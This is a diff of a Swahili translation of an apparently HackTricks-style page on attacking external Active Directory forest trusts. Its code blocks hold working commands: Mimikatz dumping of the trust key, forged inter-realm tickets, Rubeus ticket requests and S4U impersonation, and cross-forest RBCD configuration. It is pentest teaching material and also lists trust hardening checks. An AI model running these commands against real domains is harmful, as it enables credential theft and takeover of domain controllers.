@@ -1,12 +1,12 @@
-# External Forest Domain - OneWay (Inbound) au bidirectional
+# Domain ya Forest ya Nje - OneWay (Inbound) au ya pande mbili
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Katika hali hii, domain ya nje inakuamini (au zote mbili zinaaminiana), hivyo unaweza kupata aina fulani ya access kwake.
+Katika hali hii domain ya nje inakuamini (au zote mbili zinaaminiana), hivyo unaweza kupata aina fulani ya access juu yake.
 
 ## Enumeration
 
-Kwanza kabisa, unahitaji kufanya **enumerate** ya **trust**:
+Kwanza kabisa, unahitaji kufanya **enumerate** **trust**:
 ```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
@@ -59,15 +59,15 @@ IsDomain     : True
 # Additional trust hygiene checks (AD RSAT / AD module)
 Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
 ```
-> `SelectiveAuthentication`/`SIDFiltering*` hukuwezesha kuona kwa haraka ikiwa njia za cross-forest abuse (RBCD, SIDHistory) zina uwezekano wa kufanya kazi bila prerequisites za ziada.<sup>[[2]](#references)</sup>
+> `SelectiveAuthentication`/`SIDFiltering*` hukuruhusu kuona haraka ikiwa njia za cross-forest abuse (RBCD, SIDHistory) zina uwezekano wa kufanya kazi bila mahitaji ya ziada.<sup>[[2]](#references)</sup>
 
-Katika enumeration ya awali iligunduliwa kuwa user **`crossuser`** yuko ndani ya group la **`External Admins`** ambalo lina **Admin access** ndani ya **DC ya external domain**.
+Katika enumeration ya awali iligunduliwa kuwa user **`crossuser`** yuko ndani ya group ya **`External Admins`**, ambayo ina **Admin access** ndani ya **DC ya external domain**.
 
-## Initial Access
+## Ufikiaji wa Awali
 
-Ikiwa **hukuweza** kupata access yoyote **special** ya user wako katika domain nyingine, bado unaweza kurudi kwenye AD Methodology na kujaribu kufanya **privesc kutoka kwa unprivileged user** (mambo kama kerberoasting, kwa mfano):
+Ikiwa **hukuweza** kupata access yoyote **maalum** ya user wako katika domain nyingine, bado unaweza kurudi kwenye AD Methodology na kujaribu kufanya **privesc kutoka kwa user asiye na privilege** (kwa mfano, mambo kama kerberoasting):
 
-Unaweza kutumia **Powerview functions** kufanya **enumerate** **domain nyingine** kwa kutumia param ya `-Domain`, kama ilivyo kwenye:
+Unaweza kutumia **Powerview functions** kufanya **enumerate** **domain nyingine** kwa kutumia param ya `-Domain`, kama katika:
 ```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
@@ -79,15 +79,15 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 
 ### Kuingia
 
-Kwa kutumia njia ya kawaida pamoja na credentials za users walio na access kwenye external domain, unapaswa kuwa na uwezo wa kuifikia:
+Kwa kutumia njia ya kawaida pamoja na credentials za users wenye access ya external domain, unapaswa kuweza kupata access:
 ```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
 ### SID History Abuse
 
-Unaweza pia kutumia vibaya [**SID History**](sid-history-injection.md) kupitia forest trust.
+Unaweza pia kutumia vibaya [**SID History**](sid-history-injection.md) kote kwenye forest trust.
 
-Ikiwa mtumiaji atahamishwa **kutoka forest moja kwenda nyingine** na **SID Filtering haijawezeshwa**, inawezekana **kuongeza SID kutoka forest nyingine**, na **SID** hii **itaongezwa** kwenye **token ya mtumiaji** wakati wa ku-authenticate **kupitia trust**.
+Mtumiaji akihamishwa **kutoka forest moja kwenda nyingine** na **SID Filtering haijawezeshwa**, inawezekana **kuongeza SID kutoka forest nyingine**, na **SID** hii **itaongezwa** kwenye **token ya mtumiaji** wakati wa ku-authenticate **kupitia trust**.
 
 > [!WARNING]
 > Kwa ukumbusho, unaweza kupata signing key kwa kutumia
@@ -96,18 +96,18 @@ Ikiwa mtumiaji atahamishwa **kutoka forest moja kwenda nyingine** na **SID Filte
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-Unaweza **kusaini kwa kutumia** **trusted key** TGT **inayemwakilisha** mtumiaji wa domain ya sasa.
+Unaweza **kusaini kwa kutumia** key ya **trusted** **TGT inayomwakilisha** mtumiaji wa domain ya sasa.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
 
 # Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
 ## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
-Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap
+Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### Njia kamili ya kumwiga mtumiaji
+### Njia kamili ya kuiga mtumiaji
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -117,11 +117,11 @@ Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:d
 
 # Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
 ## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
-Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap
+Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### RBCD ya cross-forest unapodhibiti machine account katika trusting forest (no SID filtering / selective auth)
+### Cross-forest RBCD unapodhibiti machine account katika trusting forest (hakuna SID filtering / selective auth)
 
 Ikiwa foreign principal (FSP) yako inakuweka katika group inayoweza kuandika computer objects katika trusting forest (kwa mfano, `Account Operators`, custom provisioning group), unaweza kusanidi **Resource-Based Constrained Delegation** kwenye target host ya forest hiyo na ku-impersonate user yeyote huko:
 ```bash
@@ -134,15 +134,14 @@ Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=
 # 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
 Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
 ```
-Hii hufanya kazi tu wakati **SelectiveAuthentication imezimwa** na **SID filtering** haiondoi SID yako ya kudhibiti. Hii ni njia ya haraka ya lateral movement inayokwepa SIDHistory forging na mara nyingi haizingatiwi katika ukaguzi wa trust.<sup>[[2]](#references)</sup>
+Hii hufanya kazi tu wakati **SelectiveAuthentication imezimwa** na **SID filtering** haiondoi SID yako ya kudhibiti. Ni njia ya haraka ya lateral movement inayokwepa forging ya SIDHistory na mara nyingi hupuuzwa katika ukaguzi wa trust.<sup>[[2]](#references)</sup>
 
 ### Uimarishaji wa uthibitishaji wa PAC
 
-Masasisho ya uthibitishaji wa sahihi ya PAC kwa **CVE-2024-26248**/**CVE-2024-29056** yanaongeza utekelezaji wa kusaini kwenye tickets za inter-forest. Katika **Compatibility mode**, njia za inter-realm PAC/SIDHistory/S4U zilizoghushiwa bado zinaweza kufanya kazi kwenye DC ambazo hazijafanyiwa patch. Katika **Enforcement mode**, data ya PAC isiyotiwa sahihi au iliyochezewa inayovuka forest trust hukataliwa isipokuwa uwe pia na trust key ya target forest. Registry overrides (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) zinaweza kudhoofisha hili maadamu bado zinapatikana.<sup>[[1]](#references)</sup>
+Masasisho ya uthibitishaji wa sahihi ya PAC ya **CVE-2024-26248**/**CVE-2024-29056** yanaongeza utekelezaji wa kusaini kwenye tickets za inter-forest. Katika **Compatibility mode**, njia za forged za inter-realm PAC/SIDHistory/S4U bado zinaweza kufanya kazi kwenye DC ambazo hazijapatchiwa. Katika **Enforcement mode**, data ya PAC isiyotiwa sahihi au iliyobadilishwa inayovuka forest trust hukataliwa isipokuwa pia uwe na trust key ya forest lengwa. Registry overrides (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) zinaweza kudhoofisha hili wakati bado zinapatikana.<sup>[[1]](#references)</sup>
 
-## Marejeleo
+## References
 
-- [1] [Microsoft KB5037754 – Mabadiliko ya uthibitishaji wa PAC kwa CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
-- [2] [MS-PAC spec – Maelezo ya SID filtering & claims transformation](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
-
+- [1] [Microsoft KB5037754 – Mabadiliko ya uthibitishaji wa PAC kwa CVE-2024-26248 na CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
+- [2] [Maelezo ya MS-PAC – Maelezo ya SID filtering na claims transformation](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
 {{#include ../../banners/hacktricks-training.md}}
